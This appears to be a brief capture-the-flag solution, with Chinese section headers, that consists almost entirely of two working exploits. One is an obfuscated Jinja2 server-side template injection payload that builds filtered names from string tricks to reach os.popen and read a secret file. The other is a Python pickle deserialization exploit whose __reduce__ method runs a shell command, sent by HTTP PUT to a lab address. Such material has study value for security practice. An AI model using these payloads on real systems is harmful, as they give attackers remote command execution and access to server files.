# SSTI部分

```py
{%set nine=dict(aaaaaaaaa=a)|join|count%}
{%set eighteen=dict(aaaaaaaaaaaaaaaaaa=a)|join|count%}
{%set pop=dict(pop=a)|join%}
{%set xhx=(lipsum|string|list)|attr(pop)(eighteen)%}
{%set kg=(lipsum|string|list)|attr(pop)(nine)%}
{%set globals=(xhx,xhx,dict(globals=a)|join,xhx,xhx)|join%}
{%set getitem=(xhx,xhx,dict(getitem=a)|join,xhx,xhx)|join%}
{%set os=dict(os=a)|join%}
{%set popen=dict(popen=a)|join%}
{%set flag=(dict(cat=a)|join,kg,dict(secret=a)|join)|join%}
{%set read=dict(read=a)|join%}
{{lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(flag)|attr(read)()}}
```

# 反序列化部分

```py
import base64
import pickle
import httpx
class A:
    def __reduce__(self):
        import subprocess
        s = '''
import subprocess
r = subprocess.run(
    'cat F1@g', 
    shell=True,
    check=True,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT
)
print(r.stdout.decode())
        '''
        return (subprocess.check_output, (["python3","-c",s],))
a = A()
data = {
    'payload': base64.b64encode(pickle.dumps(a)).decode()
}
r = httpx.put('http://192.168.88.141:8001/hugh', json=data)
print(r.text)
```

